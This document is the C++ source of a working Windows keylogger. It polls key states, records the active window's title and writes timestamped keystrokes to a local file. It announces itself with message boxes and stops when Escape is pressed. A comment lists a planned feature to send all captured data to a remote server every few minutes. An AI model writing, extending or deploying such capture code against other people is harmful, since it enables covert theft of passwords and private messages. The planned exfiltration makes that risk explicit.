// Bug 1: if a key is held down it only detects the input once

// Bug 2: Checks whether window is same rather than window title. Changing tab on Chrome doesn't update the window writer, but probably should

// Keys to add: None

// Clean up code

// Future features	
// Make it send all the information to a server I set up, possibly every 5 minutes or so

#include <fstream> // Write to file
#include <windows.h> // Get key presses
#include <time.h> // Get current time
#include <string>

const int KEY_RANGE = 83; // Set to 1 higher than number of keys initialised
const int BUFFER_DUMP_LENGTH = 100; // Flush buffer to file when it reaches this size
const int MAX_WINDOW_LENGTH = 128; // Will truncate window titles longer than 128 chars

class vkey;

void initialise_vkeys(vkey (&vkey_list)[KEY_RANGE]);
void write_output(std::string &buffer, std::string file_path, std::string additional_message);
void check_window_state(HWND& current_window, std::string& buffer, std::string file_path);
std::string get_file_path();

class vkey {
    bool is_down;
    std::string lower_case;
    std::string upper_case;
    int vk_state;
    bool cmd_key; // Keys used for keyboard shortcuts like Ctrl, Tab etc;
public:
    void detect_press(std::string &buffer, bool& cmd_key_down) {
        if (GetAsyncKeyState(vk_state)) {
            if (cmd_key) cmd_key_down = true;
            if (!is_down) {
                buffer_output(buffer, cmd_key_down);
                //if (vkey_list[i].vk_state == VK_BACK && !buffer.empty()) buffer.pop_back();
            }
            is_down = true;
        }
        else is_down = false;
    }

    void buffer_output(std::string& buffer, bool& cmd_key_down) {
        if (cmd_key_down && !cmd_key) buffer.append("(");
        if (!GetAsyncKeyState(VK_SHIFT) || upper_case.empty()) buffer.append(lower_case);
        else buffer.append(upper_case);
        if (cmd_key_down && !cmd_key) buffer.append(")");
    }

    vkey() { // Default constructor
        is_down = false; // Tracks whether button was down in previous iteration of main loop
        lower_case = "";
        upper_case = "";
        vk_state = 0;
        cmd_key = false;
    }
    vkey(std::string s1, std::string s2, int i1) { // Constructor for case sensitive keys
        is_down = false;
        lower_case = s1;
        upper_case = s2;
        vk_state = i1;
        cmd_key = false;
    }
    vkey(std::string s1, int i1) { // Constructor for case insensitive keys
        is_down = false;
        lower_case = s1;
        upper_case = ""; // Saves memory compared to setting it to s1
        vk_state = i1;
        cmd_key = false;
    }
    vkey(std::string s1, int i1, bool b1) { // Constructor for case insensitive keys
        is_down = false;
        lower_case = s1;
        upper_case = ""; // Saves memory compared to setting it to s1
        vk_state = i1;
        cmd_key = b1;
    }
};

void initialise_vkeys(vkey (&vkey_list)[KEY_RANGE]) {
    const std::string character_list = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789)!\"$£%^&*(";
    for (int i = 0; i < 36; i++) { // Create letters and numbers. Clean this code up later, it needlessly converts between chars and strings
        char c = character_list[i]; // Get ith character from string
        if (i <= 25) vkey_list[i] = vkey(std::string(1, tolower(c)), std::string(1, c), int(c)); // If we're writing a letter
        else vkey_list[i] = vkey(std::string(1, c), std::string(1, character_list[i + 10]), int(c)); // If we're writing a number
    }
    vkey_list[36] = vkey(" ", VK_SPACE);
    vkey_list[37] = vkey("\n", VK_RETURN);
    vkey_list[38] = vkey("(Backspace)", VK_BACK);
    vkey_list[39] = vkey("(Tab)", VK_TAB);
    vkey_list[40] = vkey("(Ctrl)", VK_CONTROL, true);
    vkey_list[41] = vkey("(Alt)", VK_MENU, true);
    vkey_list[42] = vkey("", VK_SHIFT);
    vkey_list[43] = vkey(";", ":", VK_OEM_1);
    vkey_list[44] = vkey("/", "?", VK_OEM_2);
    vkey_list[45] = vkey("'", "@", VK_OEM_3); 
    vkey_list[46] = vkey("=", "+", VK_OEM_PLUS);
    vkey_list[47] = vkey("-", "_", VK_OEM_MINUS);
    vkey_list[48] = vkey(",", "<", VK_OEM_COMMA);
    vkey_list[49] = vkey(".", ">", VK_OEM_PERIOD);
    vkey_list[50] = vkey("[", "{", VK_OEM_4);
    vkey_list[51] = vkey("]", "}", VK_OEM_6);
    vkey_list[52] = vkey("\\", "|", VK_OEM_5);
    vkey_list[53] = vkey("#", "~", VK_OEM_7);
    vkey_list[54] = vkey("0", VK_NUMPAD0);
    vkey_list[55] = vkey("1", VK_NUMPAD1);
    vkey_list[56] = vkey("2", VK_NUMPAD2);
    vkey_list[57] = vkey("3", VK_NUMPAD3);
    vkey_list[58] = vkey("4", VK_NUMPAD4);
    vkey_list[59] = vkey("5", VK_NUMPAD5);
    vkey_list[60] = vkey("6", VK_NUMPAD6);
    vkey_list[61] = vkey("7", VK_NUMPAD7);
    vkey_list[62] = vkey("8", VK_NUMPAD8);
    vkey_list[63] = vkey("9", VK_NUMPAD9);
    vkey_list[64] = vkey("(F1)", VK_F1);
    vkey_list[65] = vkey("(F2)", VK_F2);
    vkey_list[66] = vkey("(F3)", VK_F3);
    vkey_list[67] = vkey("(F4)", VK_F4);
    vkey_list[68] = vkey("(F5)", VK_F5);
    vkey_list[69] = vkey("(F6)", VK_F6);
    vkey_list[70] = vkey("(F7)", VK_F7);
    vkey_list[71] = vkey("(F8)", VK_F8);
    vkey_list[72] = vkey("(F9)", VK_F9);
    vkey_list[73] = vkey("(F10)", VK_F10);
    vkey_list[74] = vkey("(F11)", VK_F11);
    vkey_list[75] = vkey("(F12)", VK_F12);
    vkey_list[76] = vkey("(Del)", VK_DELETE);
    vkey_list[77] = vkey("(Win)", VK_LWIN, true);
    vkey_list[78] = vkey("`","¬", VK_OEM_8);
    vkey_list[79] = vkey("(Up)", VK_UP);
    vkey_list[80] = vkey("(Down)", VK_DOWN);
    vkey_list[81] = vkey("(Left)", VK_LEFT);
    vkey_list[82] = vkey("(Right)", VK_RIGHT);
}

std::string get_file_path() {
    char* cPath = getenv("HomeDrive");
    std::string path = std::string(cPath);
    cPath = getenv("HomePath");
    std::to_string(time(0));
    path.append(cPath);
    path.append("\\Documents\\Keylogger\\keylog" + std::to_string(time(0)) + ".txt");
    return path;
}

void write_output(std::string& buffer, std::string file_path, std::string additional_message = "") {
        std::ofstream log_file(file_path, std::ios::out | std::ios::app);
        if (log_file.is_open()) {
            time_t current_time = time(0);
            char* cformatted_time = ctime(&current_time);
            std::string formatted_time = std::string(cformatted_time);
            formatted_time.pop_back();
            log_file << "[" << formatted_time << "]" << buffer << additional_message << '\n';
            log_file.close();
        }
        buffer = "";
}

void check_window_state(HWND& current_window, std::string& buffer, std::string file_path) {
    HWND new_window = GetForegroundWindow();
    if (current_window != new_window && new_window != NULL) {
        char window_name[MAX_WINDOW_LENGTH];
        GetWindowTextA(new_window, window_name, MAX_WINDOW_LENGTH);
        write_output(buffer, file_path, "<<" + std::string(window_name) + ">>");
        current_window = new_window;
    }
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance, // Run in invisible window
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    MessageBoxA(NULL, "Keylogger running", "Keylogger", MB_OK);
    vkey vkey_list[KEY_RANGE];
    initialise_vkeys(vkey_list);
    const std::string file_path = get_file_path();
    std::string buffer = "";
    HWND current_window = GetForegroundWindow();
    bool cmd_key_down;
    while (1) {
        cmd_key_down = false;
        if (GetAsyncKeyState(VK_ESCAPE)) { // Terminate program when escape is pressed
            // Fix memory leak later
            write_output(buffer, file_path, "<<KEYLOGGER TERMINATED>>");
            MessageBoxA(NULL, "Keylogger ended", "Keylogger", MB_OK);
            break;
        }
        // Loop through keys
        for (int i = KEY_RANGE - 1; i >= 0; i--) { // Loop backwards so command keys are executed before letters and numbers, this makes sure keyboard shortcuts display letters in brackets
            vkey_list[i].detect_press(buffer,cmd_key_down);
        }
        // If window changes write output to file
        check_window_state(current_window, buffer, file_path);
        // Write output to file when buffer string is long enough, or tab is pressed
        if (buffer.length() >= BUFFER_DUMP_LENGTH) {
            write_output(buffer, file_path);
        }
        Sleep(10);
    }
    return 0;
}
